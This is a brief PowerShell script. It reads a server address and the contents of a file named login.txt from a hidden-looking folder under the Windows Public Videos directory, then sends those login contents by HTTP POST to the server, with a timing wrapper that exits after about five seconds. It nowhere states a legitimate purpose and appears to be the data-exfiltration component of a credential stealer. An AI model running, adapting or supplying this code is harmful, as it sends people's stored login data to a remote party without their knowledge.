$urlFile = "C:\Users\Public\Videos\GraphicalUserInterface\url.txt"
$loginFile = "C:\Users\Public\Videos\GraphicalUserInterface\login.txt"

# Read the server IP from the url.txt file
$serverIP = Get-Content -Path $urlFile

# Read the content of login.txt
$loginContent = Get-Content -Path $loginFile -Raw

try {
    # Start a stopwatch to measure elapsed time
    $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()

    # Send the login content to the server
    $response = Invoke-WebRequest -Uri "$serverIP" -Method POST -Body $loginContent -TimeoutSec 60
    if ($response.StatusCode -eq 200) {
        Write-Host "Data sent."
    } else {
        Write-Host "Error: Unexpected response status code $($response.StatusCode)."
    }
}
catch {
    Write-Host "Error: $_"
}
finally {
    # Calculate the elapsed time
    $elapsedTime = $stopwatch.Elapsed.TotalSeconds

    # If the elapsed time is greater than 5 seconds, force exit the script
    if ($elapsedTime -gt 5) {
        Write-Host "Script execution time exceeded 5 seconds. Terminating script."
        exit
    }
    else {
        # If the script execution is within the timeout limit, wait for the remaining time
        $remainingTime = 5 - $elapsedTime
        Write-Host "Script executed within time limit. Waiting for $remainingTime seconds before exiting."
        Start-Sleep -Seconds $remainingTime
    }
}
